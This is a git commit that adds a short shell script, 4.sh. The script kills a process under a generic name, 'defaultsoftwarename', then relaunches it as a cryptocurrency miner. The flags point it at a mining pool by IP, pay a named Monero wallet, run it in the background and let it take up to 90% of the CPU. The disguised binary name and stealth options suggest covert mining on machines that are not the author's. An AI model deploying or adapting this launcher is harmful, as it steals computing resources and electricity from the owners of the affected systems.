69fbcac61c6f5fc64c5622520d9b280dd68acc31
solscobbturpa <57539661+solscobbturpa@users.noreply.github.com>
2020-04-26 13:48:04 -0700

    Add files via upload

---
+++ 4.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 116.202.248.230:20015 -u 42yUs43a28BQPN2BaYZtuT1N4V7vATA1Sj4STnpTS4jyL4PgWTCNrukhbNDGnZguCr6o7LHDQkUjGDeu3FTGkqnjHCTZeAT --pass=x:solscobbturpa@gmail.com --rig-id=5 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
